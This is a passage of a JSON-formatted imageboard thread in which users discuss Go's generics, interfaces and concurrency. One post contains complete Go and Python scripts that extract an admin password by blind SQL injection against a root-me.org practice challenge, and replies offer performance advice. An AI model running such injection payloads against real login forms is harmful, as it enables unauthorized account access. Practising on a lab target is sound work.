ugly.","name":"Moore","time":1561502012,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561502012},{"no":14030,"resto":6019,"com":"<a onclick=\"highlightReply('14018', event);\" href=\"\/\u03bb\/res\/6019.html#14018\">&gt;&gt;14018<\/a><br\/>Pascal.","name":"FILLER","time":1561592960,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561592960},{"no":14037,"resto":6019,"com":"<a onclick=\"highlightReply('14018', event);\" href=\"\/\u03bb\/res\/6019.html#14018\">&gt;&gt;14018<\/a><br\/>Haskell, Idris","name":"Shogun","time":1561619908,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561619908},{"no":14061,"resto":6019,"com":"<a onclick=\"highlightReply('13420', event);\" href=\"\/\u03bb\/res\/6019.html#13420\">&gt;&gt;13420<\/a><br\/><br\/>I don't think you can redeclare the interface method with a different type. Since `ISeq` implements `IPersistentCollection`, you should be able to return an `ISeq` even if you declare that `Cons()` returns an `IPersistentCollection` since they will both satisfy the interface.","name":"dictionary","time":1561787242,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561787242},{"no":14413,"resto":6019,"com":"<a onclick=\"highlightReply('6019', event);\" href=\"\/\u03bb\/res\/6019.html#6019\">&gt;&gt;6019<\/a><br\/>i think im going to have to use go in one of my projects at uni for a web app, ive only made web apps in java before<br\/> is there a jsp like interface for go ?<br\/>and what should i expect going into this?","name":"Chani","time":1564453888,"sticky":0,"locked":0,"cyclical":"0","last_modified":1564453888},{"no":14429,"resto":6019,"com":"<a onclick=\"highlightReply('6268', event);\" href=\"\/\u03bb\/res\/6019.html#6268\">&gt;&gt;6268<\/a><br\/>From what I've read about generics, they seem more like a labour-saving code-reuse feature rather than a feature that enables otherwise-unavailable functionality. Is this accurate? (I'm an amateur returning to programming as a hobby again after a two-decade absence, so if I'm wrong here, please let me know.)","name":"synchronized","time":1564537688,"sticky":0,"locked":0,"cyclical":"0","last_modified":1564537688},{"no":14430,"resto":6019,"com":"<a onclick=\"highlightReply('14429', event);\" href=\"\/\u03bb\/res\/6019.html#14429\">&gt;&gt;14429<\/a><br\/>... yep. That's exactly it. Any problem you can solve in a turing complete language, you can solve with another turing complete language. Therefore, any <em>convenience<\/em> provided by one, that the other lacks, can be solved through feats of greater exertion or repetition. If you rate features exclusively on the weight of \"does it allow me to do something I otherwise couldn't do?\" you will therefore always be disappointed.<br\/>Language features do not grant new capabilities. Programmers had all the power they needed with FORTRAN.<br\/>Generics let you write code once and then apply it to many different types. You could just copy&amp;paste your code, but in practice, over time, such copies tend to diverge. Consider:<br\/>1. you write the code, you copy&amp;paste it, you must make some changes to your pastes in order to customize them for the actual types they're working with. So the copies are immediately different enough that you can't just patch them. You also have to customize any further work.<br\/>2. Later, someone else finds a bug or improvement in your code, and this other person makes changes to... some of the copies, because not all types benefit from the improvement, or have the bug (an unnecessary copy of a string might leak memory; an unnecessary copy of an int might not). So now the copies are <em>very<\/em> different.<br\/>3. Later, another bug\/improvement is found, and this time the effort required to tell your boss \"yes, I definitely fixed\/improved it in all of the copies of the code\" is equivalent to the effort of writing the code in the first place, because now each copy is only similar enough to confuse you. You violated <em>don't repeat yourself<\/em> and now you're seeing double and you're stumbling through your code like an idiot, and you make a mistake--you introduce a new bug. But don't worry, because it's only one copy that's completely broken, it'll be a good while before the value of your business is slashed because of it.","name":"John Titor","time":1564550917,"sticky":0,"locked":0,"cyclical":"0","last_modified":1564550917},{"no":14440,"resto":6019,"com":"<a onclick=\"highlightReply('14430', event);\" href=\"\/\u03bb\/res\/6019.html#14430\">&gt;&gt;14430<\/a><br\/>Thanks for the explanation. My professional background is in accounting and documentation management. From that perspective I suppose I just see generics as an imperfect workaround for incomplete documentation.<br\/><br\/>But then, I'm not a pro developer, nor do I ever plan to become one. I'm just a hobbyist looking to replace my small-business employer's ugly mishmash of Excel\/Access\/VBA job quotation insanity with a homegrown web app. (Nothing public-facing, nothing complex, nothing on a tight timeline, just something I can run on our LAN and tweak as necessary and document myself. Go is turning out to be fantastic for that.) I suppose the day-to-day realities of pro software developers dealing with large codebases and deadlines makes sticking to strict documentation standards difficult.","name":"t","time":1564581166,"sticky":0,"locked":0,"cyclical":"0","last_modified":1564581166},{"no":14586,"resto":6019,"com":"<a onclick=\"highlightReply('6279', event);\" href=\"\/\u03bb\/res\/6019.html#6279\">&gt;&gt;6279<\/a><br\/>God fuarrrking damn this. This thing is really just BARELY object oriented.","name":"Unsigned","time":1565246310,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565246310},{"no":14589,"resto":6019,"com":"<a onclick=\"highlightReply('14440', event);\" href=\"\/\u03bb\/res\/6019.html#14440\">&gt;&gt;14440<\/a><br\/><span class=\"quote\">&gt;I just see generics as an imperfect workaround for incomplete documentation.<\/span><br\/>It's not really a documentation thing. It's an issue of abstraction. Imagine if you had to rewrite a function every time you wanted to use it. That's what not having generics or an equivalent solution is like.","name":"Cat Mother","time":1565250605,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565250605},{"no":14594,"resto":6019,"com":"<a onclick=\"highlightReply('14589', event);\" href=\"\/\u03bb\/res\/6019.html#14589\">&gt;&gt;14589<\/a><br\/>Interfaces my guy","name":"Hopper","time":1565276770,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565276770},{"no":14611,"resto":6019,"com":"<a onclick=\"highlightReply('6224', event);\" href=\"\/\u03bb\/res\/6019.html#6224\">&gt;&gt;6224<\/a><br\/>What a terrible hack.","name":"car","time":1565390358,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565390358},{"no":14612,"resto":6019,"com":"<a onclick=\"highlightReply('14586', event);\" href=\"\/\u03bb\/res\/6019.html#14586\">&gt;&gt;14586<\/a><br\/>You can do OO with interfaces. It is not very complicated. Go does not do advanced OO like generics and templating - basically all of the cruft that made people hate C++ or Java.<br\/><br\/>You can even make go do inheritance with a class that implements an interface. I will admit that if you go this route things get rather convoluted however.","name":"Armitage","time":1565391091,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565391091},{"no":14624,"resto":6019,"com":"<a onclick=\"highlightReply('14612', event);\" href=\"\/\u03bb\/res\/6019.html#14612\">&gt;&gt;14612<\/a><br\/>Yes, I also use Go.","name":"ThatFuckingFuck","time":1565506145,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565506145},{"no":14727,"resto":6019,"com":"I liked this post:<br\/><a href=\"https:\/\/blog.chewxy.com\/2018\/03\/18\/golang-interfaces\/\" rel=\"nofollow\" target=\"_blank\">https:\/\/blog.chewxy.com\/2018\/03\/18\/golang-interfaces\/<\/a><br\/><br\/>It explains the benefits of structurally typed interfaces fairly well imho. The consumer of a type declares the interface rather than the creator of a type.","name":"Junichi Fujiwara","time":1565892599,"sticky":0,"locked":0,"cyclical":"0","last_modified":1565892599},{"no":14865,"resto":6019,"com":"<a onclick=\"highlightReply('6224', event);\" href=\"\/\u03bb\/res\/6019.html#6224\">&gt;&gt;6224<\/a><br\/>absolutely disgusting","name":"Cypher","time":1566671934,"sticky":0,"locked":0,"cyclical":"0","last_modified":1566671934},{"no":14866,"resto":6019,"com":"<a onclick=\"highlightReply('14023', event);\" href=\"\/\u03bb\/res\/6019.html#14023\">&gt;&gt;14023<\/a><br\/><a onclick=\"highlightReply('6085', event);\" href=\"\/\u03bb\/res\/6019.html#6085\">&gt;&gt;6085<\/a><br\/>And kubernetes and openshift","name":"Jim Hilger","time":1566672247,"sticky":0,"locked":0,"cyclical":"0","last_modified":1566672247},{"no":15061,"resto":6019,"com":"I have to say Go is pretty nice to have as a tool. It has one of the nicest cross-platform GUI libraries I've seen at this point: <a href=\"https:\/\/github.com\/fyne-io\/fyne\" rel=\"nofollow\" target=\"_blank\">https:\/\/github.com\/fyne-io\/fyne<\/a><br\/><br\/>I'm thinking of using Go for the GUI &amp; Backend for an free-as-in-speech-and-beer polling app for use in college classes, hosted by using the teacher's laptop as a server. Assuming a couple hundred student connections at most, I can easily just have one Goroutine handling the connection to each student concurrently and think of everything iteratively.<br\/><br\/>Right now I'm TAing a class that uses TurningPoint and it's frankly horrible, and requires students to pay money for a subscription to the company to get a decent grade in class. I'm thinking of writing the software to replace TurningPoint for the next year that the class is taught.<br\/><br\/>Still undecided for the frontend though. I'm considering Elm for a web frontend for laptops &amp; tablets since it is extremely easy to write a single-page application in. However, for smartphone frontends, the mobile app ecosystem is generally horrible and every option is bad. I might consider Dart.","name":"Davis","time":1567734949,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567734949},{"no":15064,"resto":6019,"com":"<a onclick=\"highlightReply('6069', event);\" href=\"\/\u03bb\/res\/6019.html#6069\">&gt;&gt;6069<\/a><br\/>It's a valid complaint,no generics means you don't have map, reduce, filter and you are forced to copy similar code when you could just &lt;T&gt;.","name":"Mario Rossi","time":1567759236,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567759236},{"no":15067,"resto":6019,"com":"<a onclick=\"highlightReply('15064', event);\" href=\"\/\u03bb\/res\/6019.html#15064\">&gt;&gt;15064<\/a><br\/>Right. The way I view it is that it turns Go from a general purpose language to a DSL for specific tasks. <br\/><br\/>I still find it very useful for those tasks though. It's great for basic command line tools, anything to do with networking, and now also for quick GUI applications.<br\/><br\/>I'd be less likely to use it for larger personal projects though, and it's ridiculously useless for anything mathy\/scientific in my experience, where the lack of generics and operator overloading really hurts it a lot.","name":"Unnamed","time":1567794096,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567794096},{"no":15068,"resto":6019,"com":"<a onclick=\"highlightReply('15064', event);\" href=\"\/\u03bb\/res\/6019.html#15064\">&gt;&gt;15064<\/a><br\/><span class=\"quote\">&gt;It's a valid complaint,no generics means you don't have map, reduce, filter and you are forced to copy similar code when you could just &lt;T&gt;.<\/span><br\/>On the other hand, one doesn't need to shoehorn in all sorts of edge case handling. There's something to be said for a function that's laser-focused on a particular problem. It's all a matter of perspective, use-case, individual approach, etc.","name":"Acid Burn","time":1567803465,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567803465},{"no":15070,"resto":6019,"com":"<a onclick=\"highlightReply('15068', event);\" href=\"\/\u03bb\/res\/6019.html#15068\">&gt;&gt;15068<\/a><br\/><span class=\"quote\">&gt;There's something to be said for a function that's laser-focused on a particular problem.<\/span><br\/>The Go language doesn't particularly strike me as a language that's focused on a particular set of problems.  The APL language is certainly focused an array manipulations and whatnot.  Go, however, just has a large amount of libraries suited for certain tasks, right?<br\/><br\/>That's something I think about these languages, that they're all so similar they differentiate themselves based on purpose more than anything else.  If you look at Go, it's a basic C-syntax ALGOL-derivative language.  If you take away the libraries and purpose statements, would you still think it's suited and laser-focused for certain problems?<br\/><br\/>Feel free to disagree, but this is to me like so many other languages that clearly look alike and act alike and try to differentiate themselves purely on purpose rather than anything more inherent; one sees this with Python, PHP, Rust, JavaScript, et al.","name":"XERXES","time":1567837603,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567837603},{"no":15075,"resto":6019,"com":"<a onclick=\"highlightReply('15070', event);\" href=\"\/\u03bb\/res\/6019.html#15070\">&gt;&gt;15070<\/a><br\/>Goroutines and Channels based on CSP are a significant differentiating feature. <br\/><br\/>Go arguably had the best concurrency solution for networking upon launch, which has since been copied by a few newer languages. It's a massively better solution than any of the async\/await stuff that falls into the red &amp; blue function trap.<br\/><br\/>Only thing that I'd consider comparable would be something like Erlang since the Actor model is basically the dual of the CSP model. It's basically personal preference between the two, but Go's model is much nicer for an imperative approach imho.","name":"Hopper","time":1567867402,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567867402},{"no":15077,"resto":6019,"com":"<a onclick=\"highlightReply('15075', event);\" href=\"\/\u03bb\/res\/6019.html#15075\">&gt;&gt;15075<\/a><br\/>You can do some really interesting things with channels in go. I recently implemented a worker queue with custom callback functions, by passing a go routine with as the channel argument, allowing my worker queue to execute the go routines passed to it. The cool thing that because the callback is a go routine, you can basically build your own callbacks in real time. I'd like to see another compiled language do that.","name":"Yamaoto Toshi","time":1567869823,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567869823},{"no":15101,"resto":6019,"com":"<a onclick=\"highlightReply('15070', event);\" href=\"\/\u03bb\/res\/6019.html#15070\">&gt;&gt;15070<\/a><br\/>You *completely* misunderstood what I meant by the phrase \"laser-focused on a particular problem\". I meant it in the sense of this: one can copy a function with a similar purpose from one's previous code, and adapt it to fit a specific purpose. This lends itself well to optimization.<br\/><br\/>I don't know what sort of nutty tangent you're going off on, man.","name":"\u2191","time":1567985926,"sticky":0,"locked":0,"cyclical":"0","last_modified":1567985926},{"no":15135,"resto":6019,"com":"<a onclick=\"highlightReply('15101', event);\" href=\"\/\u03bb\/res\/6019.html#15101\">&gt;&gt;15101<\/a><br\/>What normal language can't do that?","name":"fsociety","time":1568098244,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568098244},{"no":15144,"resto":6019,"com":"<a onclick=\"highlightReply('15135', event);\" href=\"\/\u03bb\/res\/6019.html#15135\">&gt;&gt;15135<\/a><br\/>Languages that encourage the fetishization of generics as crutches, to the point of normalizing optimization-slaughtering \"I'll just add code to handle that edge case in the class\" behaviour.","name":"drop","time":1568161176,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568161176},{"no":15148,"resto":6019,"com":"<a onclick=\"highlightReply('15144', event);\" href=\"\/\u03bb\/res\/6019.html#15144\">&gt;&gt;15144<\/a><br\/>Such as. Give any example.","name":"Fred Nurk","time":1568194827,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568194827},{"no":15149,"resto":6019,"com":"<a onclick=\"highlightReply('15148', event);\" href=\"\/\u03bb\/res\/6019.html#15148\">&gt;&gt;15148<\/a><br\/>Java seems to be a very good example of this. Java has an obsession with boilerplate and interface bloat. One can choose to use a highly modular approach with Go, but just like C++, you're given the option not to conform to any specific software paradigm.","name":"Turing","time":1568196483,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568196483},{"no":15162,"resto":6019,"com":"<a onclick=\"highlightReply('15101', event);\" href=\"\/\u03bb\/res\/6019.html#15101\">&gt;&gt;15101<\/a><br\/>omg gophers are still saying this soykaf after 10 years.<br\/>it should be added to <a href=\"http:\/\/golang.web.fc2.com\/\" rel=\"nofollow\" target=\"_blank\">http:\/\/golang.web.fc2.com\/<\/a>","email":"sage","name":"Crazy Jake","time":1568247669,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568247669,"tn_h":200,"tn_w":200,"h":800,"w":800,"fsize":118733,"filename":"gopher lineage retarded","ext":".png","tim":"1568247669088","md5":"f+mppUdB03izL5jHna8MwA=="},{"no":15192,"resto":6019,"com":"<a onclick=\"highlightReply('15149', event);\" href=\"\/\u03bb\/res\/6019.html#15149\">&gt;&gt;15149<\/a><br\/>Java's problem certainly isn't generics. Anyone who has dealt with pre-generics Java and the constant need for type casting will tell you that.","name":"over","time":1568343051,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568343051},{"no":15232,"resto":6019,"com":"<a onclick=\"highlightReply('15162', event);\" href=\"\/\u03bb\/res\/6019.html#15162\">&gt;&gt;15162<\/a><br\/><span class=\"quote\">&gt;user was derezzed for an anti-go comment<\/span><br\/>LOL. lain users never dissappoint","name":"Agent Richard Gill","time":1568687423,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568687423,"tn_h":113,"tn_w":200,"h":240,"w":426,"fsize":12376,"filename":"garfielf wut?!","ext":"deleted","tim":"","md5":"68V+MsCQNxlKEKqCSSTx7A=="},{"no":15233,"resto":6019,"com":"s\/derezzed\/b\u0430nned\/","name":"Yu-ichi","time":1568687486,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568687486},{"no":15295,"resto":6019,"com":"<a onclick=\"highlightReply('15232', event);\" href=\"\/\u03bb\/res\/6019.html#15232\">&gt;&gt;15232<\/a><br\/>That's a warning, because there was no elaboration on the opinion.  Regardless of how you feel about Go, it gets the same rules for discussion as any other language.","name":"if","time":1568971617,"sticky":0,"locked":0,"cyclical":"0","last_modified":1568971617},{"no":15346,"resto":6019,"com":"<a onclick=\"highlightReply('15295', event);\" href=\"\/\u03bb\/res\/6019.html#15295\">&gt;&gt;15295<\/a><br\/>no elaboration was needed<br\/>it's blatantly obvious to any well seasoned programmer, that rewriting concrete instances of a polymorphic type for N types, does not magically lend to optimization.","name":"Chan Siu Ming","time":1569212457,"sticky":0,"locked":0,"cyclical":"0","last_modified":1569212457},{"no":15350,"resto":6019,"com":"<a onclick=\"highlightReply('15346', event);\" href=\"\/\u03bb\/res\/6019.html#15346\">&gt;&gt;15346<\/a><br\/>I agree, but there's a difference between explaining it how you have and just posting a meme image.","name":"Guthrie","time":1569227904,"sticky":0,"locked":0,"cyclical":"0","last_modified":1569227904},{"no":15353,"resto":6019,"com":"<a onclick=\"highlightReply('15350', event);\" href=\"\/\u03bb\/res\/6019.html#15350\">&gt;&gt;15350<\/a><br\/>perhaps you should have went with PHPBB instead of an imageboard for your website","name":"Dr. X","time":1569245388,"sticky":0,"locked":0,"cyclical":"0","last_modified":1569245388,"tn_h":172,"tn_w":200,"h":490,"w":570,"fsize":39199,"filename":"fak","ext":"deleted","tim":"","md5":"zl6QM7WVJKlq2kggdmy3Vg=="},{"no":15544,"resto":6019,"com":"Code is slow as fuarrrk, python is faster. How do I make it faster guys?<br\/>If you want to run it yourself, log in to root-me.org first.<br\/>Go:<br\/><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package<\/span> main<br\/><br\/><span class=\"hljs-keyword\">import<\/span> (<br\/>\t\t<span class=\"hljs-string\">\"bytes\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"fmt\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"io\/ioutil\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"log\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"net\/http\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"net\/url\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"os\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"strconv\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"time\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"unicode\"<\/span><br\/>)<br\/><br\/><span class=\"hljs-keyword\">var<\/span> targetUrl *url.URL<br\/><span class=\"hljs-keyword\">var<\/span> password <span class=\"hljs-keyword\">string<\/span><br\/><span class=\"hljs-keyword\">var<\/span> foundChan <span class=\"hljs-keyword\">chan<\/span> <span class=\"hljs-keyword\">bool<\/span><br\/><span class=\"hljs-keyword\">var<\/span> found <span class=\"hljs-keyword\">bool<\/span><br\/><span class=\"hljs-keyword\">var<\/span> keyphrase []<span class=\"hljs-keyword\">byte<\/span><br\/><br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">init<\/span><span class=\"hljs-params\">()<\/span><\/span> {<br\/>\t\t<span class=\"hljs-keyword\">var<\/span> err error<br\/>\t\ttargetUrl, err = url.Parse(<span class=\"hljs-string\">\"<a href=\"http:\/\/challenge01.root-me.org\/web-serveur\/ch10\/\" rel=\"nofollow\" target=\"_blank\">http:\/\/challenge01.root-me.org\/web-serveur\/ch10\/<\/a>\"<\/span>)<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tlog.Fatal(err)<br\/>\t\t}<br\/>\t\tkeyphrase = []<span class=\"hljs-keyword\">byte<\/span>(<span class=\"hljs-string\">\"admin\"<\/span>)<br\/>}<br\/><br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">main<\/span><span class=\"hljs-params\">()<\/span><\/span> {<br\/>\t\tfmt.Println(<span class=\"hljs-string\">\"Starting bruteforce.\"<\/span>)<br\/>\t\tfmt.Print(<span class=\"hljs-string\">\"Password: \"<\/span>)<br\/><br\/>\t\tstart := time.Now()<br\/><br\/>\t\tquery := targetUrl.Query()<br\/>\t\tquery.Set(<span class=\"hljs-string\">\"password\"<\/span>, <span class=\"hljs-string\">\"whatever\"<\/span>)<br\/>\t\tfoundChan := <span class=\"hljs-built_in\">make<\/span>(<span class=\"hljs-keyword\">chan<\/span> <span class=\"hljs-keyword\">bool<\/span>, <span class=\"hljs-number\">1<\/span>)<br\/><br\/>\t\t<span class=\"hljs-keyword\">for<\/span> i := <span class=\"hljs-keyword\">range<\/span> <span class=\"hljs-built_in\">make<\/span>([]<span class=\"hljs-keyword\">int<\/span>, <span class=\"hljs-number\">8<\/span>) {<br\/>\t\t\t\t<span class=\"hljs-keyword\">for<\/span> letter := <span class=\"hljs-number\">32<\/span>; letter &lt; unicode.MaxLatin1; letter++ {<br\/>\t\t\t\t\t\t<span class=\"hljs-keyword\">go<\/span> makeRequest(letter, i, &amp;query, foundChan)<br\/>\t\t\t\t\t\tfound = &lt;-foundChan<br\/>\t\t\t\t\t\t<span class=\"hljs-keyword\">if<\/span> found {<br\/>\t\t\t\t\t\t\t\t<span class=\"hljs-keyword\">break<\/span><br\/>\t\t\t\t\t\t}<br\/>\t\t\t\t}<br\/><br\/>\t\t\t\t<span class=\"hljs-keyword\">if<\/span> found {<br\/>\t\t\t\t\t\t<span class=\"hljs-keyword\">continue<\/span><br\/>\t\t\t\t}<br\/>\t\t\t\t<span class=\"hljs-comment\">\/\/ Didn't find the letter, using placeholder \".\"<\/span><br\/>\t\t\t\tfmt.Print(<span class=\"hljs-string\">\".\"<\/span>)<br\/>\t\t\t\tos.Stdout.Sync()<br\/>\t\t}<br\/><br\/>\t\tt := time.Now()<br\/>\t\telapsed := t.Sub(start)<br\/>\t\tfmt.Printf(<span class=\"hljs-string\">\"\\nTime elapsed: %s\\n\"<\/span>, elapsed)<br\/>\t\tfmt.Println(<span class=\"hljs-string\">\"Done.\"<\/span>)<br\/>}<br\/><br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">makeRequest<\/span><span class=\"hljs-params\">(letter <span class=\"hljs-keyword\">int<\/span>, index <span class=\"hljs-keyword\">int<\/span>, query *url.Values, found <span class=\"hljs-keyword\">chan<\/span> <span class=\"hljs-keyword\">bool<\/span>)<\/span><\/span> {<br\/>\t\tl := <span class=\"hljs-keyword\">string<\/span>(letter)<br\/>\t\tpayload := <span class=\"hljs-string\">`' OR substr(password,`<\/span> + strconv.Itoa(index+<span class=\"hljs-number\">1<\/span>) + <span class=\"hljs-string\">`,1)='`<\/span> + l + <span class=\"hljs-string\">`'-- -`<\/span><br\/>\t\tquery.Set(<span class=\"hljs-string\">\"username\"<\/span>, payload)<br\/>\t\tresp, err := http.PostForm(targetUrl.String(), *query)<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tlog.Fatal(err)<br\/>\t\t}<br\/>\t\t<span class=\"hljs-keyword\">defer<\/span> resp.Body.Close()<br\/>\t\tbody, err := ioutil.ReadAll(resp.Body)<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tlog.Fatal(err)<br\/>\t\t}<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tlog.Fatal(err)<br\/>\t\t}<br\/><br\/>\t\t<span class=\"hljs-keyword\">if<\/span> bytes.Contains(body, keyphrase) {<br\/>\t\t\t\tl := <span class=\"hljs-keyword\">string<\/span>(letter)<br\/>\t\t\t\tfound &lt;- <span class=\"hljs-literal\">true<\/span><br\/>\t\t\t\tpassword = password + l<br\/>\t\t\t\tfmt.Print(l)<br\/>\t\t\t\tos.Stdout.Sync()<br\/>\t\t} <span class=\"hljs-keyword\">else<\/span> {<br\/>\t\t\t\tfound &lt;- <span class=\"hljs-literal\">false<\/span><br\/>\t\t}<br\/>} <\/code><\/pre>Python:<br\/><pre><code class=\"hljs lua\">import urllib, urllib2, <span class=\"hljs-built_in\">string<\/span>, sys, <span class=\"hljs-built_in\">time<\/span><br\/>from bs4 import BeautifulSoup as bs<br\/><br\/>sys.<span class=\"hljs-built_in\">stdout<\/span>.<span class=\"hljs-built_in\">write<\/span>(<span class=\"hljs-string\">'Pass: '<\/span>)<br\/>sys.<span class=\"hljs-built_in\">stdout<\/span>.<span class=\"hljs-built_in\">flush<\/span>()<br\/><br\/>start_time = <span class=\"hljs-built_in\">time<\/span>.<span class=\"hljs-built_in\">time<\/span>()<br\/><br\/>found = False<br\/><span class=\"hljs-keyword\">for<\/span> j <span class=\"hljs-keyword\">in<\/span> range(<span class=\"hljs-number\">1<\/span>,<span class=\"hljs-number\">9<\/span>):<br\/>    found=False<br\/>    <span class=\"hljs-keyword\">for<\/span> i <span class=\"hljs-keyword\">in<\/span> <span class=\"hljs-built_in\">string<\/span>.printable:<br\/>        payload= <span class=\"hljs-string\">'\\' OR substr(password,'<\/span> + str(j) + <span class=\"hljs-string\">',1)=\\''<\/span> + i + <span class=\"hljs-string\">'\\'-- -'<\/span><br\/>        param = { <span class=\"hljs-string\">'username'<\/span>: payload, <span class=\"hljs-string\">'password'<\/span>: <span class=\"hljs-string\">'whatever'<\/span> }<br\/>        value = urllib.urlencode(param)<br\/>        request = urllib2.Request(<span class=\"hljs-string\">\"<a href=\"http:\/\/challenge01.root-me.org\/web-serveur\/ch10\/\" rel=\"nofollow\" target=\"_blank\">http:\/\/challenge01.root-me.org\/web-serveur\/ch10\/<\/a>\"<\/span>, value)<br\/>        response = urllib2.urlopen(request)<br\/><br\/>        soup = bs(response.<span class=\"hljs-built_in\">read<\/span>(), <span class=\"hljs-string\">'html.parser'<\/span>)<br\/>        <span class=\"hljs-keyword\">if<\/span>(soup.findAll(<span class=\"hljs-string\">'h2'<\/span>, <span class=\"hljs-built_in\">string<\/span>=<span class=\"hljs-string\">'Welcome back admin !'<\/span>)):<br\/>            found=True<br\/>            # <span class=\"hljs-built_in\">print<\/span> soup.p<br\/>            sys.<span class=\"hljs-built_in\">stdout<\/span>.<span class=\"hljs-built_in\">write<\/span>(i)<br\/>            sys.<span class=\"hljs-built_in\">stdout<\/span>.<span class=\"hljs-built_in\">flush<\/span>()<br\/>            <span class=\"hljs-keyword\">break<\/span><br\/>    <span class=\"hljs-keyword\">if<\/span>(<span class=\"hljs-keyword\">not<\/span> found):<br\/>        sys.<span class=\"hljs-built_in\">stdout<\/span>.<span class=\"hljs-built_in\">write<\/span>(<span class=\"hljs-string\">'.'<\/span>)<br\/>        sys.<span class=\"hljs-built_in\">stdout<\/span>.<span class=\"hljs-built_in\">flush<\/span>()<br\/><span class=\"hljs-built_in\">print<\/span><br\/><span class=\"hljs-built_in\">print<\/span>(<span class=\"hljs-string\">\"--- %s seconds ---\"<\/span> % (<span class=\"hljs-built_in\">time<\/span>.<span class=\"hljs-built_in\">time<\/span>() - start_time)) <\/code><\/pre>","name":"Dujour","time":1570701297,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570701297},{"no":15546,"resto":6019,"com":"<a onclick=\"highlightReply('15544', event);\" href=\"\/\u03bb\/res\/6019.html#15544\">&gt;&gt;15544<\/a><br\/><span class=\"quote\">&gt;for i := range make([]int, 8) {<\/span><br\/>do a regular for loop (for i := 0; i &lt; 8; i++).<br\/><span class=\"quote\">&gt;go makeRequest(letter, i, &amp;query, foundChan)<\/span><br\/><span class=\"quote\">&gt;found = &lt;-foundChan<\/span><br\/>so you're starting the request in a seperate thread, but then waiting for it to find something before continuing?<br\/><span class=\"quote\">&gt;query.Set(\"username\", payload)<\/span><br\/>since this is a pointer object, you're modifying the shared variable, right? So what's the point on concurrency?<br\/><span class=\"quote\">&gt;body, err := ioutil.ReadAll(resp.Body)<\/span><br\/><span class=\"quote\">&gt; ...<\/span><br\/><span class=\"quote\">&gt; if bytes.Contains(body, keyphrase) {<\/span><br\/>why read all into memory? I don't know what kind of data you're handeling here, but maybe consider using the regexp package or something along those lines.<br\/>Also you're double-error checking.<br\/><span class=\"quote\">&gt;l := string(letter)<\/span><br\/>why do you keep converting characters to letters?<br\/><br\/>Consider setting up an actual worker pool, pushing requests into a channel and reading from another one. Look into the sync package, especially WaitGroup. Avoid unnecessary copying. Just these few things should speed things up.<br\/><br\/>Also, just style-wise, there's no need for that init.","name":"limited","time":1570711818,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570711818},{"no":15547,"resto":6019,"com":"<a onclick=\"highlightReply('15546', event);\" href=\"\/\u03bb\/res\/6019.html#15546\">&gt;&gt;15546<\/a><br\/><span class=\"quote\">&gt;concurrency<\/span><br\/>Actually was also wondering about the point of concurrency here but I wanted to try it. You have to generate the payload, send the request and look if it matches the keyphrase so I thought it could be done concurrently, but then the password needs to be in the right order.<br\/>Should I abandon it entirely or would you have an idea on how to use it better?<br\/><span class=\"quote\">&gt;I don't know what kind of data you're handeling here<\/span><br\/>Html, I send a login request and if the SQL request is tru then I get a \"Welcome back admin\" on the login page, otherwise it just loads the login page as normal.<br\/><span class=\"quote\">&gt;&gt;l := string(letter)<\/span><br\/><span class=\"quote\">&gt;why do you keep converting characters to letters?<\/span><br\/>l is an int, either I convert it to string or I convert to int (used as int in the payload).<br\/><span class=\"quote\">&gt;Consider setting up an actual worker pool, pushing requests into a channel and reading from another one. Look into the sync package, especially WaitGroup. Avoid unnecessary copying. Just these few things should speed things up.<\/span><br\/>Will look into it.<br\/><span class=\"quote\">&gt;Also, just style-wise, there's no need for that init.<\/span><br\/>Isn't that good practice, especially if you want to add command line parsing in the future?<br\/><br\/>Thanks for the help lainon.","name":"Unnamed","time":1570716588,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570716588},{"no":15550,"resto":6019,"com":"<a onclick=\"highlightReply('15547', event);\" href=\"\/\u03bb\/res\/6019.html#15547\">&gt;&gt;15547<\/a><br\/><a 